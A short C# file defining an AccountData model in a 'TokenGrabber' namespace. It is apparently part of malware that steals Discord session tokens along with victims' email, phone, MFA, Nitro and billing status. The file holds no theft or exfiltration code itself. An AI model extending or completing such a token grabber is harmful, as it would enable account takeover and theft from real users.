namespace TokenGrabber.Models;

internal sealed class AccountData
{
    public string Username { get; init; } = string.Empty;
    public string Discriminator { get; init; } = "0";
    public string? Email { get; init; }
    public string? Phone { get; init; }
    public string UserId { get; init; } = string.Empty;
    public bool HasNitro { get; init; }
    public int NitroType { get; init; }
    public bool MfaEnabled { get; init; }
    public int GuildCount { get; init; }
    public bool HasBilling { get; init; }
    public string Token { get; init; } = string.Empty;

    public string DisplayName => Discriminator == "0"
        ? $"@{Username}"
        : $"{Username}#{Discriminator}";
}
